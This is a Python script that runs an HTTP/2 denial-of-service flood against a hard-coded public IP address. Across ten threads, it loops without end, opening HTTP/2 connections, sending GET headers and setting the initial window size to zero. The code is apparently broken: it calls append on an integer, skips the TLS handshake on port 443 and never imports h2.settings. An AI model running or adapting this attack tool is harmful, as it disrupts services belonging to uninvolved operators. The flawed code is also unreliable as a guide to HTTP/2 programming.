import socket
import threading
import h2.connection
import time

def exploit_http2_dos(target_ip):
    try:
        # Establish a TCP connection to the target IP on port 80 (HTTP)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # s.connect((target_ip, 80))
        s.connect((target_ip, 443))

        # Initialize HTTP/2 connection
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        s.sendall(conn.data_to_send())

        # Send the initial HTTP/2 GET request with manipulated window size
        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(
            stream_id,
            [(":method", "GET"), (":path", "/"), (":scheme", "https"), (":authority", target_ip)],
            end_stream=True
        )
        conn.update_settings({h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: 0})  # Manipulate window size
        s.sendall(conn.data_to_send())

        # Flood the server with additional HTTP/2 GET requests with manipulated window size
        while True:
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(
                stream_id,
                [(":method", "GET"), (":path", "/"), (":scheme", "https"), (":authority", target_ip)],
                end_stream=True
            )
            conn.update_settings({h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: 0})  # Manipulate window size again
            s.sendall(conn.data_to_send())
            time.sleep(0.1)  # Delay to control the request rate

    except Exception as e:
        print(f"Error: {e}")

    finally:
        s.close()  # Close the TCP connection

# Target IP address
target_ip = "200.146.193.143"

# Number of threads to create for concurrent execution
num_threads = 10
threads = 10

# Create and start each thread to execute the exploit_http2_dos function
for _ in range(num_threads):
    thread = threading.Thread(target=exploit_http2_dos, args=(target_ip,))
    thread.start()
    threads.append(thread)

# Wait for all threads to complete before proceeding
for thread in threads:
    thread.join()

print("Flood attack complete.")
